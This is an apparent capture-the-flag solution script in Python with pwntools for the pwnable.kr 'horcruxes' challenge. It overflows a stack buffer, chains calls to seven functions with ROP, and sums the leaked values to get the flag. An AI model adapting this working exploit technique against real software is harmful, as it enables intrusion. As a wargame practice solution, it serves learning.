from pwn import *

elf = ELF('./horcruxes')

s = ssh("horcruxes", "pwnable.kr", port=2222, password="guest")

p = s.process(["nc", "0", "9032"])

print(p.recvuntil(b'Menu:').decode())

p.sendline('1'.encode())
print('1')

print(p.recvuntil(b':').decode())

'''a = p32(0x809fe4b)
b = p32(0x809fe6a)
c = p32(0x809fe89)
d = p32(0x809fea8)
e = p32(0x809fec7)
f = p32(0x809fee6)
g = p32(0x809ff05)

payload = b''
payload += b'A' * 100       # fill buffer           0x64
payload += p32(1337)        # int on stack          0x68
payload += p32(420)         # int on stack          0x6c
payload += p32(69)          # int on stack          0x70
payload += p32(123456)      # int on stack          0x74
payload += b'B' * 4         # base pointer          $ebp - 0x0

payload += a                # overwrite ret addr    $ebp + 0x4
payload += b
payload += c
payload += d
payload += e
payload += f
payload += g

payload += p32(0x809fffc)'''

rop = ROP(elf)

rop.call('A')
rop.call('B')
rop.call('C')
rop.call('D')
rop.call('E')
rop.call('F')
rop.call('G')

payload = b''
payload += b'A' * 100               # fill buffer           0x64
payload += p32(1337)                # int on stack          0x68
payload += p32(420)                 # int on stack          0x6c
payload += p32(69)                  # int on stack          0x70
payload += p32(123456)              # int on stack          0x74
payload += b'B' * 4                 # base pointer          $ebp - 0x0

payload += rop.chain()              # ret addr
payload += p32(0x809fffc)           # funciton call in main to call ropme
# payload += p32(elf.symbols['ropme'])


p.sendline(payload)

text = p.recvuntil(b'Menu:').decode().replace(' ', '')
print(text)

exp_values = re.findall(r'[+-]?\d+', text)
print(exp_values)

exp = sum([int(e) if e.startswith('-') else int(e[1:]) for e in exp_values])

print(exp)

p.sendline('2'.encode())

print(p.recvuntil(b'?'))

p.sendline(str(exp).encode())

print(p.recvall())